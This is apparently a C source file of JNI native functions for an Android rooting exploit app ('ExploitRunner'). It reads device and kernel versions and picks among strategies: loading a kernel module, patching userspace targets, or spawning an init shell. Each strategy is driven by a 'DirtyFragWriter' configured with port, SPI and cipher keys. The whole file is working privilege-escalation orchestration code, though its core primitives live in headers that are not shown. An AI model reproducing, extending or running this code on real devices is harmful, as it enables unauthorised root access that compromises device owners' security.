#include <jni.h>
#include <stdint.h>

#include "dirtyfrag_writer.h"
#include "patch_window.h"
#include "payloads.h"
#include "reporter.h"
#include "root_runtime.h"
#include "target_registry.h"

enum NativeStrategy {
    STRATEGY_UNSUPPORTED = 0,
    STRATEGY_MODULE = 1,
    STRATEGY_PATCH_WINDOW = 2,
    STRATEGY_INIT_SHELL = 3,
};

static int configure_writer(JNIEnv *env, struct DirtyFragWriter *writer,
                            jint encap_port, jint spi,
                            jbyteArray aes_key_array,
                            jbyteArray hmac_key_array,
                            jint icv_length, jint sender_port) {
    if (!aes_key_array || !hmac_key_array
            || (*env)->GetArrayLength(env, aes_key_array) != 32
            || (*env)->GetArrayLength(env, hmac_key_array) != 32
            || encap_port <= 0 || encap_port > 65535
            || sender_port <= 0 || sender_port > 65535
            || icv_length <= 0 || icv_length > 32)
        return -1;

    uint8_t aes_key[32];
    uint8_t hmac_key[32];
    (*env)->GetByteArrayRegion(env, aes_key_array, 0, 32, (jbyte *)aes_key);
    (*env)->GetByteArrayRegion(env, hmac_key_array, 0, 32, (jbyte *)hmac_key);
    if ((*env)->ExceptionCheck(env)) {
        (*env)->ExceptionClear(env);
        return -1;
    }
    dirtyfrag_writer_init(writer, encap_port, sender_port, (uint32_t)spi,
                          aes_key, hmac_key, icv_length);
    return 0;
}

JNIEXPORT jint JNICALL
Java_df_root_ExploitRunner_nativeSelectStrategy(
        JNIEnv *env, jclass type __attribute__((unused)), jobject reporter_object) {
    struct Reporter reporter_storage = {.env = env, .obj = reporter_object};
    struct Reporter *reporter = &reporter_storage;
    int android_release = 0, kernel_major = 0, kernel_minor = 0;
    if (read_device_versions(&android_release,
                             &kernel_major, &kernel_minor) == 0) {
        if (select_ko_image(android_release, kernel_major, kernel_minor)) {
            REPORTLN("strategy candidate: exact KMI android%d-%d.%d module; runtime carrier checks pending",
                     android_release, kernel_major, kernel_minor);
            return STRATEGY_MODULE;
        }
        REPORTLN("module strategy rejected: no exact android%d-%d.%d image",
                 android_release, kernel_major, kernel_minor);
    } else {
        REPORTLN("module strategy rejected: kernel release has no Android KMI tag");
    }

    const struct InitTarget *init_target = find_init_target(reporter);
    if (init_target) {
        REPORTLN("strategy match: reversible init shell target %s",
                 init_target->id);
        return STRATEGY_INIT_SHELL;
    }
    const struct PatchTarget *patch_target = find_patch_target(reporter);
    if (patch_target) {
        REPORTLN("strategy candidate: reversible userspace patch target %s; protected guards pending",
                 patch_target->id);
        return STRATEGY_PATCH_WINDOW;
    }
    REPORTLN("strategy match: none; add an exact target only after byte-level validation");
    return STRATEGY_UNSUPPORTED;
}

JNIEXPORT jint JNICALL
Java_df_root_ExploitRunner_nativeRunPatchWindow(
        JNIEnv *env, jclass type __attribute__((unused)), jobject reporter_object,
        jstring state_path_string, jint window_ms,
        jint encap_port, jint spi, jbyteArray aes_key,
        jbyteArray hmac_key, jint icv_length, jint sender_port) {
    struct Reporter reporter_storage = {.env = env, .obj = reporter_object};
    struct Reporter *reporter = &reporter_storage;
    struct DirtyFragWriter writer;
    const struct PatchTarget *target = find_patch_target(reporter);
    const char *state_path = state_path_string
        ? (*env)->GetStringUTFChars(env, state_path_string, NULL) : NULL;
    int result = 40;
    if (!target || !state_path
            || configure_writer(env, &writer, encap_port, spi,
                                aes_key, hmac_key,
                                icv_length, sender_port) != 0) {
        REPORTLN("patch window blocked: no exact target or invalid transport");
    } else {
        result = run_patch_window(&writer, target, state_path,
                                  window_ms, reporter);
    }
    if (state_path)
        (*env)->ReleaseStringUTFChars(env, state_path_string, state_path);
    return result;
}

JNIEXPORT jint JNICALL
Java_df_root_ExploitRunner_nativeRunInitShell(
        JNIEnv *env, jclass type __attribute__((unused)), jobject reporter_object,
        jint encap_port, jint spi, jbyteArray aes_key,
        jbyteArray hmac_key, jint icv_length, jint sender_port) {
    struct Reporter reporter_storage = {.env = env, .obj = reporter_object};
    struct Reporter *reporter = &reporter_storage;
    struct DirtyFragWriter writer;
    const struct InitTarget *target = find_init_target(reporter);
    if (!target || configure_writer(env, &writer, encap_port, spi,
                                    aes_key, hmac_key,
                                    icv_length, sender_port) != 0) {
        REPORTLN("init shell blocked: no exact target or invalid transport");
        return 3;
    }
    return run_init_strategy(&writer, target, reporter);
}

JNIEXPORT jint JNICALL
Java_df_root_ExploitRunner_nativeRunAll(
        JNIEnv *env, jclass type __attribute__((unused)), jobject reporter_object,
        jstring ko_target_path, jint encap_port, jint spi,
        jbyteArray aes_key, jbyteArray hmac_key, jint icv_length,
        jint sender_port, jboolean soft_reboot) {
    struct Reporter reporter_storage = {.env = env, .obj = reporter_object};
    struct Reporter *reporter = &reporter_storage;
    struct DirtyFragWriter writer;
    if (!ko_target_path
            || configure_writer(env, &writer, encap_port, spi,
                                aes_key, hmac_key,
                                icv_length, sender_port) != 0) {
        REPORTLN("module strategy blocked: invalid target or transport");
        return 3;
    }
    const char *ko_target = (*env)->GetStringUTFChars(env, ko_target_path, NULL);
    if (!ko_target) return 3;
    int result = run_module_strategy(&writer, ko_target,
                                     soft_reboot ? 1 : 0, reporter);
    (*env)->ReleaseStringUTFChars(env, ko_target_path, ko_target);
    return result;
}
